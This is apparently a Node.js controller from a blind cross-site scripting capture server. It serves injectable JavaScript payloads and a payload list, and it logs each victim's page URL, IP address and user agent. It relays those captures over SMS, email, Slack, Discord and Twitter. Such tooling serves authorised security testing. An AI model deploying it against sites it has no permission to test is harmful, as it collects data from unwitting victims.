// Copyright 2019 Lewis Ardern. All rights reserved.

const uuid = require('uuid/v1');

const sms = require('server/utilities/services/sms');
const save = require('server/utilities/save');
const config = require('server/utilities/config')();
const template = require('server/utilities/templates/script');
const payloads = require('server/utilities/payloads');
const Domain = require('server/utilities/domain');

const reporters = [
  require('server/utilities/services/email'),
  require('server/utilities/services/slack'),
  require('server/utilities/services/discord'),
  require('server/utilities/services/spark'),
  require('server/utilities/services/twitter')
];


/* eslint-disable no-shadow */
function reportToUtilities(guid, domain, config) {
  reporters.forEach(svc => svc.send(guid, domain, config));
}

function sendSmsAndSaveToDisk(domain, res, guid) {
  if (!sms.lastSms()) {
    console.log(`Sending SMS And Saving To Disk For URL ${domain.url}`);
    sms.sendSMS(guid, domain, config, save);
  } else {
    console.log(`Already Sent SMS Today, Saving To Disk For URL ${domain.url}`);
  }
  save.saveCapuredResults(guid, domain, config);
  res.redirect(domain.url);
}

exports.displayScript = (req, res) => {
  res.type('.js');
  res.send(template.generateTemplate(config));
};

exports.displayDefault = (req, res) => {
  res.type('.js');
  res.send('alert(1)');
};

exports.generatePayloads = (req, res) => {
  res.set('Content-Type', 'text/plain');
  res.send(payloads.generatePayloads(config));
};

exports.capture = (req, res) => {
  let domain = {};
  const guid = uuid();
  if (req.body._) {
    domain = Domain.fromPayload(req.body._, config);
  } else {
    domain = new Domain(config);
    console.log(req.get('referer'));
    domain.url = req.get('referer') || null;
  }
  domain.victimIP =
    req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    req.connection.socket.remoteAddress ||
    null;
  domain.userAgent = req.headers['user-agent'] || null;

  sendSmsAndSaveToDisk(domain, res, guid);

  reportToUtilities(guid, domain, config);
};
